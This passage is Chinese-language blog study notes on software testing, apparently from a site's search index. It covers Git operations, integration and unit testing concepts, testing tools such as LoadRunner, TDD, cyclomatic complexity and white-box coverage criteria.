<li><strong>分支（Branch）</strong>：树杈，每人（组）维护一个分支，等稳定后合并到主线</li>
</ul>
<p>使用分支意味着可以吧工作从开发主线上分离开来，以免影响主线，比如：每个人都有代码/文档提交到一个公共服务器，避免互相影响，自己提交到自己的分支里，然后由专门的人来合并（merge）到主干分支。</p>
</li>
</ol>
<h3 id="Git-的常用操作"><a href="#Git-的常用操作" class="headerlink" title="Git 的常用操作"></a>Git 的常用操作</h3><ol>
<li> <strong>Git 克隆</strong>：url + 本地目录，获取远程的仓库地址，并且有对应的账号权限，克隆代码/文档到本地</li>
<li> <strong>Git 拉取</strong>：远程仓库例的文件更新了，下拉到本地：git拉取 -&gt; 选择分支 -&gt; 确认；点击拉取到的差异，可查看本次的变动</li>
</ol>
<ul>
<li><strong>拉取(pull)：可以自动进行分支的合并，用得较多</strong></li>
<li>获取(fetch)：不可以自动合并分支，用得较少</li>
</ul>
<ol start="3">
<li> <strong>Git 推送</strong>：本地新增了文件/代码，需要推送到远程仓库。</li>
</ol>
<ul>
<li>添加(add)：添加到本地缓存区</li>
<li>提交(commit)：提交到本地库，需要添加描述日志（此时远程github是没有文件的）</li>
<li>推送(push)：推送到远程仓库（远程仓库有了此文件）</li>
</ul>
<ol start="4">
<li><strong>Git 删除</strong>：先删除本地文档<ul>
<li>提交：删除的本地库里的文件（远程文件还在）</li>
<li>推送：删除远程仓库的文件（远程文件不在了）</li>
</ul>
</li>
<li><strong>Git  撤回</strong>：误操作之后，再未提及之前，可以revert</li>
</ol>
<h2 id="浏览器兼容性测试"><a href="#浏览器兼容性测试" class="headerlink" title="浏览器兼容性测试"></a>浏览器兼容性测试</h2><p>软硬件平台兼容 （系统）</p>
<p>软件与软件之间</p>
<p>不同软件版本之间</p>
<h2 id="牛客题目补充知识"><a href="#牛客题目补充知识" class="headerlink" title="牛客题目补充知识"></a>牛客题目补充知识</h2><h3 id="系统集成测试包括哪些过程？"><a href="#系统集成测试包括哪些过程？" class="headerlink" title="系统集成测试包括哪些过程？"></a>系统集成测试包括哪些过程？</h3><p><strong>系统集成测试</strong>主要包括以下过程：</p>
<ol>
<li>构建的确认过程。 </li>
<li>补丁的确认过程。 </li>
<li>系统集成测试测试组提交过程。 </li>
<li>测试用例设计过程。 </li>
<li>测试代码编写过程。 </li>
<li>Bug的报告过程。 </li>
<li>每周/每两周的构建过程。 </li>
<li>点对点的测试过程。 </li>
<li>组内培训过程。</li>
</ol>
<h3 id="软件调试技术有哪些"><a href="#软件调试技术有哪些" class="headerlink" title="软件调试技术有哪些"></a>软件调试技术有哪些</h3><p><strong>软件调试技术：</strong> </p>
<ul>
<li><p>试探法（强行排错法）</p>
</li>
<li><p>回溯法：人工沿着程序的控制流程往跟踪代码，直到找出错误根源为止</p>
</li>
<li><p>对分查找法：缩小错误的范围</p>
</li>
<li><p>归纳演绎</p>
</li>
<li><p>原因排除法</p>
</li>
</ul>
<h3 id="软件测试详细流程"><a href="#软件测试详细流程" class="headerlink" title="软件测试详细流程"></a>软件测试详细流程</h3><p>（1）单元测试、集成测试、确认测试、系统测试、发版测试</p>
<h3 id="测试对应参考什么文档？"><a href="#测试对应参考什么文档？" class="headerlink" title="测试对应参考什么文档？"></a>测试对应参考什么文档？</h3><ul>
<li>单元测试，详细设计文档</li>
<li>集成测试，概括设计文档</li>
<li>系统测试，系统设计文档</li>
</ul>
<h3 id="自顶向下测试和自底向上测试"><a href="#自顶向下测试和自底向上测试" class="headerlink" title="自顶向下测试和自底向上测试"></a>自顶向下测试和自底向上测试</h3><ul>
<li><strong>自顶向下测试</strong>：是从程序的初始模块开始测试。</li>
</ul>
<p>​    （1）该方***在早期发现顶层的错误。</p>
<p>​    （2）早期的程序框架可以进行演示</p>
<p>​    （3）需要开发桩模块辅助测试。有些甚至需要多个桩模块辅助，加大了桩模块本来的错误影响。</p>
<p>​    （4）测试完一个上层模块后，挑选哪个模块作为下一个测试模块，以及测试的顺序没有唯一的界定标准。</p>
<p>​    <strong>优点</strong>：较早地验证了主要控制和判断点；按深度优先可以首先实现和验证一个完整的软件功能；功能较早证实，带来信心；只需一个驱动，减少驱动器开发的费用；支持故障隔离。</p>
<p>​    <strong>缺点</strong>：柱的开发量大；底层验证被推迟；底层组件测试不充分。</p>
<ul>
<li><strong>自底向上测试</strong>：是从程序的底层模块开始测试。</li>
</ul>
<p>​    （1）I/O操作可以提前测试，更好提交测试用例。</p>
<p>​    （2）测试后比较容易观察输出。</p>
<p>​    （3）需要开发驱动模块。</p>
<p>​    （4）直到最后一个模块提交，程序才能完整的系统测试。</p>
<p>​    <strong>优点</strong>：对底层组件行为较早验证；工作最初可以并行集成，比自顶向下效率高；减少了桩的工作量；支持故障隔离。</p>
<p>​    <strong>缺点</strong>：驱动的开发工作量大；对高层的验证被推迟，设计上的错误不能被及时发现。</p>
<h3 id="测试用工具"><a href="#测试用工具" class="headerlink" title="测试用工具"></a>测试用工具</h3><ul>
<li>LoadRunner-负载压力测试：预测系统性能。</li>
<li>JMeter+Badboy：基于JAVA的压力测试工具，Badboy用来进行脚本的录制</li>
<li>功能测试：通过自动录制、检测和回放用户的应用操作。将输出记录同预先给定的记录比较。</li>
<li>Junit：白盒测试工具：针对代码测试</li>
<li>测试管理工具：对测试需求、计划、用例、实施进行管理</li>
<li>测试辅助工具：本身不执行，可以生成测试数据，为测试提供数据准备</li>
<li>负载压力测试：LoadRunner:预测系统行为和性能的工业标准级负载测试工具。模拟上千万用户同时实施并发操作，来实时监控可能发生的问题。</li>
<li>功能测试： QTP(quicktest professional):自动测试工具</li>
<li>白盒测试：C++ TEST（做C和C++的白盒测试）、JUnit（Java白盒测试）</li>
<li>缺陷管理工具：Mantis、BugFree、QC、TD</li>
<li>用例管理工具：TestLink、QC</li>
<li>测试辅助工具：SVN</li>
</ul>
<h3 id="LoadRunner-包括哪些部分？"><a href="#LoadRunner-包括哪些部分？" class="headerlink" title="LoadRunner 包括哪些部分？"></a>LoadRunner 包括哪些部分？</h3><p><strong>LoadRunner</strong> 是一种预测系统行为和性能的负载测试工具。通过以模拟上千万用户实施并发负载及实时性能监测的方式来确认和查找问题， 可适用于各种体系架构的自动负载测试，能预测系统行为并评估系统性能。</p>
<p>其测试组件有:</p>
<ul>
<li><p>1.VuGen Load Generator（虚拟用户生成器）用于捕获最终用户业务流程和创建自动性能测试脚本 （也称为虚拟用户脚本）。</p>
</li>
<li><p>2.Controller （控制器）用于组织、驱动、管理和监控负载测试。</p>
</li>
<li><p>3.Analysis （分析器）有助于您查看、分析和比较性能结果。</p>
</li>
</ul>
<h3 id="代码走查"><a href="#代码走查" class="headerlink" title="代码走查"></a>代码走查</h3><p>研发需要对自己的代码审核， 检查代码的正确性，这个过程我们称为<strong>代码走查</strong></p>
<p><strong>代码走查</strong>由编写代码的程序员来进行检查和组织讨论等。</p>
<h3 id="无效等价类与有效等价类"><a href="#无效等价类与有效等价类" class="headerlink" title="无效等价类与有效等价类"></a>无效等价类与有效等价类</h3><p><strong>有效等价类</strong> ： 指对于程序规格说明来说，是合理的、有意义的输入数据构成的集合。</p>
<ul>
<li>对于具体的问题，无效等价类至少应有一个，也可能有多个。</li>
<li>从满足的两个条件中，修改其中的一个条件为不满足的，那么这个一个满足，和另一个不满足的条件就是无效等价类。 两个条件都满足为有效等价类。</li>
</ul>
<p><strong>无效等价类</strong> ： 和有效等价类相反，无效等价类是指对于软件规格说明而言，没有意义的、不合理的输入数据集合。</p>
<h3 id="对手机（软件）的测试"><a href="#对手机（软件）的测试" class="headerlink" title="对手机（软件）的测试"></a>对手机（软件）的测试</h3><p>针对手机应用软件的系统测试，我们通常从如下几个角度开展：</p>
<ul>
<li>功能模块测试</li>
<li>交叉事件测试</li>
<li>压力测试</li>
<li>容量测试</li>
<li>兼容性测试</li>
<li>易用性/用户体验测试</li>
</ul>
<p>对手机可以施加的压力测试类型主要有：</p>
<ul>
<li>存储压力</li>
<li>边界压力、</li>
<li>响应能力压力</li>
<li>网络流量压力</li>
</ul>
<h3 id="单元测试工具合集"><a href="#单元测试工具合集" class="headerlink" title="单元测试工具合集"></a>单元测试工具合集</h3><p><strong>单元测试工具集合:</strong></p>
<ul>
<li><p><strong>Parasoft jtest</strong>  </p>
<p>第一个自动化Java单元<strong>测试</strong>工具</p>
</li>
<li><p><strong>Parasoft C++Test</strong>  </p>
<p>是<strong>单元测试</strong>和静态分析工具，自动测试C和C＋＋类别、功能或组件.</p>
</li>
<li><p><strong>Parasoft .TEST</strong>  </p>
<p><strong>是单元测试和静态分析工具，自动测试写在Microsoft?.NET框架的类别</strong></p>
</li>
<li><p><strong>Parasoft Insure++</strong> </p>
<p>是一个自动化的内存错误、内存泄漏的精确检测工具。</p>
</li>
<li><p><strong>Parasoft CodeWizard</strong> </p>
<p>是高级C/C++源代码分析工具，采用三百种以上行业相关的编码准则，自动识别编译器未检测到的危险的编码构造。</p>
</li>
<li><p><strong>DevPartner Studio Professional</strong> </p>
<p>是针对软件开发小组使用 Microsoft Visual C++，Microsoft Visual Basic，Java,ASP 或 HTML 设计的一套紧密配合的调试，测试和管理工具。</p>
</li>
<li><p><strong>Rational Purify</strong> </p>
<p>是一个面向VC, VB或者Java开发的测试Visual C/C++ 和Java代码中与内存有关的错误，确保整个应用程序的质量和可靠性。</p>
</li>
<li><p><strong>Rational Quantify</strong></p>
</li>
</ul>
<p>​    是一个面向VC、VB 或者Java开发的测试性能瓶颈检测工具，它可以自动检测出影响程序段执行速度的程序性能瓶颈，提供参数分析表等等直观表格。</p>
<ul>
<li><strong>Rational PureCoverage</strong></li>
</ul>
<p>​    是一个面向VC、VB或者Java开发的测试覆盖程度检测工具，它可以自动检测你的测试完整性和那些无法达到的部分。</p>
<h3 id="自动化测试的目的"><a href="#自动化测试的目的" class="headerlink" title="自动化测试的目的"></a>自动化测试的目的</h3><p>自动化测试的目的就是为了提高效率，释放人力做分析设计等工作，但不能减少工作量，代码编译阶段还是需要人为操作，并不能提高可靠性。</p>
<h3 id="静态分析与动态分析"><a href="#静态分析与动态分析" class="headerlink" title="静态分析与动态分析"></a>静态分析与动态分析</h3><p><strong>动态分析：</strong> 运行软件代码（被测软件动态执行）之后才能检测出来的缺陷，比如内存泄漏。</p>
<p><strong>静态分析：</strong>可以在运行软件代码（程序）之前的早期阶段检测可能的缺陷。</p>
<p>​    可以由<strong>机器完成</strong>，以自动“遍历”源代码并检测不合规规则。经典的例子是一个编译器，它可以找到词汇，句法甚至一些语义错误。</p>
<p>​    也可以由<strong>审查代码的人执行</strong>，以确保使用正确的编码标准和约定来构建程序，这通常称为<strong>代码审查</strong>，由同行开发人员（编写代码的开发人员以外的人）完成。比如当开发人员分析代码时，分析代码行、适当的嵌套、函数调用次数、循环复杂性等……</p>
<h3 id="测试驱动开发"><a href="#测试驱动开发" class="headerlink" title="测试驱动开发"></a>测试驱动开发</h3><p><strong>测试驱动开发</strong>是敏捷开发中的一项核心实践和技术，也是一种设计方法论。</p>
<ul>
<li><p>TDD的<strong>原理</strong>是在开发功能代码之前，先编写单元测试用例代码，测试代码确定需要编写什么产品代码。</p>
</li>
<li><p>TDD的<strong>基本思路</strong>就是通过测试来推动整个开发得进行，但测试驱动开发并不只是单纯的测试工作，而是把需求分析，设计，质量控制量化的过程。</p>
</li>
<li><p>TDD的<strong>重要目的</strong>不仅仅是测试软件，测试工作保证代码质量仅仅是其中一部分，而且是在开发过程中帮助客户和程序员去除模棱两可的需求。</p>
</li>
<li><p>TDD首先<strong>考虑使用需求</strong>（对象、功能、过程、接口等），主要是编写测试用例框架对功能的过程和接口进行设计，而测试框架可以持续进行验证。</p>
</li>
<li><p>TDD虽是敏捷方法的核心实践，但不只适用于XP（Extreme Programming），同样可以适用于敏感词开发方法和过程。</p>
</li>
<li><p><strong>优点：</strong>在任意一个开发节点都可以拿出一个可以使用，含少量bug并具一定功能的产品。</p>
</li>
<li><p><strong>缺点：</strong>增加代码量。测试代码是系统代码的两倍或更多。</p>
</li>
</ul>
<h3 id="圈复杂度"><a href="#圈复杂度" class="headerlink" title="圈复杂度"></a>圈复杂度</h3><p>在软件测试中，<strong>圈复杂度（Cyclomatic complexity）：</strong>代码逻辑复杂度的度量，提供了被测代码的路径数量。圈复杂度可通过系统控制流图的判断节点数目算出。</p>
<p><strong>基本路径V（G</strong>）：</p>
<ul>
<li>V（G）=P+1 （P是判定节点）</li>
<li>V（G）=D （D是区域数）</li>
<li>V（G）=E-N+2（E是边的条数，N是节点数）</li>
</ul>
<p>【例】某人事管理系统能管理员工的基本信息、家庭信息、学历信息、职称信息等。其中，家庭信息管理模块导出的控制流图中包含9个判断节点，那么，该模块的圈复杂度为 ____<em><strong>10</strong></em> </p>
<h3 id="白盒测试的方法-（覆盖）"><a href="#白盒测试的方法-（覆盖）" class="headerlink" title="白盒测试的方法 （覆盖）"></a>白盒测试的方法 （覆盖）</h3><p>白盒测试的<strong>测试方法</strong>有： 代码检查法、静态结构分析法、静态质量度量法、 逻辑覆盖法、基本路径测试法、 域测试 、符号测试、 路径覆盖和程序变异。</p>
<p>白盒测试法的<strong>覆盖标准</strong>有： 逻辑覆盖 、循环覆盖和基本路径测试。</p>
<p>六种覆盖方法中，<strong>覆盖准则由弱到强</strong>依次是语句覆盖、判定覆盖（分支覆盖）、条件覆盖、判定/条件覆盖、条件组合覆盖、路径覆盖。</p>
<ul>
<li><p><strong>语句覆盖</strong>是使得程序中每个语句至少被执行一次；</p>
</li>
<li><p><strong>判定覆盖</strong>是使得程序中的每个分支至少都通过一次；</p>
</li>
<li><p><strong>条件覆盖</strong>是使得判定中的每个条件获得各种可能的结果；</p>
</li>
<li><p><strong>判定/条件覆盖</strong>是使得判定中的每个条件取到各种可能的值，并使每个判定取到各种可能的结果；</p>
</li>
<li><p><strong>条件组合覆盖</strong>是使得每个判定中条件的各种可能组合都至少出现一次；</p>
</li>
<li><p><strong>路径覆盖</strong>是使得程序的每条可能路径都至少执行一次（如果程序图中有环，则要求每个环至少经过一次）</p>
</li>
</ul>
<h3 id="软件测试的各测试内容"><a href="#软件测试的各测试内容" class="headerlink" title="软件测试的各测试内容"></a>软件测试的各测试内容</h3><p><strong>单元测试</strong>以白盒为主，测试单元内部独立路径、逻辑结构、规范等；</p>
<p><strong>集成测试</strong>也是以白盒为主黑盒辅助，注重测试模块间接口数据传递，参数的个数、属性和顺序的正确性；</p>
<p><strong>系统测试</strong>主要是内容及技术接口与路径测试、功能测试、健壮性测试、性能测试、用户界面测试、信息安全测试、压力测试、可靠性测试、安装/反安装测试</p>
<p>​        系统测试、验收测试都是<strong>功能测试</strong>（黑盒测试），而单元测试、集成测试属于<strong>逻辑测试</strong>（白盒测试）</p>
<p><strong>界面元素</strong>测试包括：窗口测试、菜单测试、图标测试、文字测试、鼠标测试</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>测试</tag>
      </tags>
  </entry>
</search>
